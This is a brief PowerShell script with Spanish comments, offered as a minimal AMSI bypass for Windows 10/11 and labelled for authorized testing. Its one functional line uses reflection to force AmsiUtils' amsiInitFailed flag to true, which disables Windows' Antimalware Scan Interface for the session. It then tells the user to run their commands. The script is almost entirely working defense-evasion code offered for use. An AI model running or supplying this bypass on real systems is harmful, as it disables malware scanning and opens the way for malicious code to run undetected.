<#
.SYNOPSIS
    Bypass AMSI básico via patch en memoria (Windows 10/11).
.DESCRIPTION
    Técnica minimalista para pruebas autorizadas. Actualizado Julio 2024.
#>

# Patch AMSI (Método 1: Forzar fallo de inicialización)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Write-Output "[+] AMSI bypassed - Ejecuta tus comandos ahora"

Uso:
.\AMSI-Bypass.ps1
